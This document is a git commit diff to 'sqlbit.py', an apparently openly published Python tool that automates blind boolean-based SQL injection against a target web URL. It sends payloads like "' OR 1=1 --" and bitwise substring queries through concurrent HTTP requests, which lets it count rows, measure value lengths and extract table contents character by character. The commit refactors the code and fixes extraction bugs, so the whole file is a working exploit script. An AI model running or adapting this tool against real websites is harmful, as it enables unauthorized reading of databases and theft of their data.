db9f5ab6b5492af38ad11ce606a932783f0f5cd2
Sunlight-Rim <Kirillll.2001@yandex.ru>
2022-01-05 03:15:00 +0300

    More stable version + code refactoring, some errors fixes, output changes

--- sqlbit.py
+++ sqlbit.py
@@ -1,10 +1,12 @@
 #!/usr/bin/env python
 
 from bs4 import BeautifulSoup
+# from threading import *
 import asyncio, aiohttp
 import requests
 
-import configparser, ast
+from ast import literal_eval
+import configparser
 
 from time import time
 
@@ -12,11 +14,10 @@ from time import time
             READING CONFIG
 '''
 
-def parse_config(key, message, config):
+def read_config(key, message, config):
     if config["Default"].get(key):
         return config["Default"].get(key)
-    else:
-        return input(message)
+    return input(message)
 
 '''
             SQL PARSER
@@ -46,14 +47,13 @@ def parse_with_query(query, s, url, cookies, res_expected):
     soup = BeautifulSoup(page.text, "lxml")
     return soup.findAll(string=res_expected)
 
-async def async_parse_with_query(query, url, cookies, res_expected, pow_2, cell_bin):
+async def async_parse_with_query(query, url, cookies, res_expected, cell_bin, i, pow_2):
     async with aiohttp.ClientSession(cookies=cookies) as session:
         async with session.get(url+query) as resp:
             html = await resp.text()
             soup = BeautifulSoup(html, "lxml")
-    if soup.findAll(string=res_expected):
-        cell_bin[pow_2] = "1"
-    return
+            if soup.findAll(string=res_expected):
+                cell_bin[i][pow_2] = "1"
 
 def parser(s, url, res_true, res_false, cookies, table_name, col_name):
     rows_amount = 200
@@ -66,14 +66,14 @@ def parser(s, url, res_true, res_false, cookies, table_name, col_name):
     (res_when_true != res_when_false) else "\"' OR 1=1 --\" doesn't work"))
 
     if not table_name:
+        print("Specify the table name to continue")
         return
 
-    # find out rows number
+    # find out the rows number
     query_for_rows_num = "' OR (SELECT count(*) FROM "+table_name+") --"
     if parse_with_query(query_for_rows_num, s, url, cookies, res_true):
         print("Looks like \""+query_for_rows_num+"\" works")
         query_for_rows_num = "' OR (SELECT count(*) %s {} FROM "+table_name+") --"
-        # binary search #1
         rows_amount = binary_search(query_for_rows_num % "<", 60000, 1, s, url, cookies, res_true,)
         # additionally checking for result correctness
         if parse_with_query(query_for_rows_num.format(str(rows_amount)) % "=", s, url, cookies, res_true):
@@ -86,17 +86,17 @@ def parser(s, url, res_true, res_false, cookies, table_name, col_name):
         print("\""+query_for_rows_num+"\" doesn't works")
 
     if not col_name:
+        print("Specify the column name to continue")
         return
 
     for row_num in [str(row_int) for row_int in range(rows_amount)]:
         row_cout = str(int(row_num)+1)
 
-        # find out length of the cell value
+        # find out the length of the cell value
         query_for_rows_length = "' OR (SELECT length("+col_name+") FROM "+table_name+" LIMIT "+row_num+",1) --"
         if parse_with_query(query_for_rows_length, s, url, cookies, res_true):
-            print("Looks like \""+query_for_rows_length+"\" works")
+            print("Looks like \""+query_for_rows_length+"\" works") if row_num == '0' else None
             query_for_rows_length = "' OR (SELECT length("+col_name+") %s {} FROM "+table_name+" LIMIT "+row_num+",1) --"
-            # binary search #2
             row_len = binary_search(query_for_rows_length % "<", 150, 1, s, url, cookies, res_true,)
             # additionally checking for result correctness
             if parse_with_query(query_for_rows_length.format(str(row_len)) % "=", s, url, cookies, res_true):
@@ -107,29 +107,33 @@ def parser(s, url, res_true, res_false, cookies, table_name, col_name):
                       table_name+"\" table have about "+str(row_len)+" symbols. \
                       Please, make issue on github repo with your case")
 
-        # find out cell values "' or (SELECT unicode(substr(name,1,1)) & 512 FROM sqlite_master LIMIT 0, 1) --"
+        # find out the cell values with query like "' or (SELECT unicode(substr(name,1,1)) FROM sqlite_master LIMIT 0,1) > 0 --"
         query_for_rows = "' OR (SELECT unicode(substr("+col_name+",1,1)) FROM "+table_name+" LIMIT "+row_num+",1) > 0 --"
         if parse_with_query(query_for_rows, s, url, cookies, res_true):
-            print("Looks like \""+query_for_rows+"\" works")
-            cell_value = ""
+            print("Looks like \""+query_for_rows+"\" works") if row_num == '0' else None
+            cell_bin = []
+            [cell_bin.append({1:"0",2:"0",4:"0",8:"0",16:"0",32:"0",64:"0"}) for _ in range(row_len)]
 
-            for i in range(1, row_len + 1): # letter index
-                ch_binary = ""
+            for i in range(row_len): # character index
                 ioloop = asyncio.new_event_loop()
+                ch_binary = ""
                 tasks = []
-                cell_bin = {1:"0",2:"0",4:"0",8:"0",16:"0",32:"0",64:"0"}
-                for pow_2 in (1,2,4,8,16,32,64,128): # degrees of two for every bit
-                    query_for_rows = "' OR (SELECT unicode(substr("+col_name+","+str(i)+",1)) %26 "+str(pow_2)+" FROM "+table_name+" LIMIT "+row_num+", 1) --"
-                    tasks.append(ioloop.create_task(async_parse_with_query(query_for_rows, url, cookies, res_true, pow_2, cell_bin)))
+                for pow_2 in (1,2,4,8,16,32,64): # powers of two for each bit
+                    query_for_rows = "' OR (SELECT unicode(substr("+col_name+","+str(i+1)+",1)) %26 "+str(pow_2)+" FROM "+table_name+" LIMIT "+row_num+", 1) --"
+                    tasks.append(ioloop.create_task(async_parse_with_query(query_for_rows, url, cookies, res_true, cell_bin, i, pow_2)))
+
                 wait_tasks = asyncio.wait(tasks)
-                ioloop.run_until_complete(wait_tasks)
-                ioloop.close()
-                # convert bites dict to characters
-                cell_value = cell_value + chr(int("".join(cell_bin.values())[::-1], 2))
+                try:
+                    ioloop.run_until_complete(wait_tasks)
+                finally:
+                    ioloop.stop()
 
-            print(row_cout+" row (cell) of the \""+col_name+"\" column of the \""+\
+                # convert bites dictionary to characters
+                cell_value = ""
+                for i in range(row_len):
+                    cell_value = cell_value + chr(int("".join(cell_bin[i].values())[::-1], 2))
+            print(row_cout+" row of the \""+col_name+"\" column of the \""+\
                   table_name+"\" table is: "+"".join(cell_value))
-
     print("All rows of the \""+table_name+"\" table have been parsed") \
     if approx_rows_amount == False else \
     print("First "+rows_amount+" rows of the \""+table_name+"\" table have been parsed")
@@ -145,23 +149,24 @@ def main():
     config = configparser.ConfigParser()
     config.read("config")
 
-    url         = parse_config('url', "Input target URL: ", config)
-    res_true    = parse_config('res_true', "Response on True queries: ", config)
-    res_false   = parse_config('res_false', "Response on False queries: ", config)
-    table_name  = parse_config('table_name', "Input name of the table you know (if so): ", config)
-    col_name    = parse_config('col_name', "Input name of the column you know (if so): ", config)
-    cookies     = dict(ast.literal_eval(config["Default"].get("cookies"))) \
+    url         = read_config('url', "Input target URL: ", config)
+    res_true    = read_config('res_true', "Response on True queries: ", config)
+    res_false   = read_config('res_false', "Response on False queries: ", config)
+    table_name  = read_config('table_name', "Input name of the table you know (if so): ", config)
+    col_name    = read_config('col_name', "Input name of the column you know (if so): ", config)
+    cookies     = dict(literal_eval(config["Default"].get("cookies"))) \
                   if config["Default"].get("cookies") \
                   else dict(input("Set cookie #"+str(i)+": ").split() \
                   for i in range(int(input("Some cookies? (enter quantity or 0) "))))
 
-    t0 = time()
     # parse responses
     parser(s, url, res_true, res_false, cookies, table_name, col_name)
-    print(time() - t0)
 
 if __name__ == '__main__':
     try:
+        t0 = time()
         main()
     except KeyboardInterrupt as e:
         print(e)
+    finally:
+        print(time() - t0, '\n')
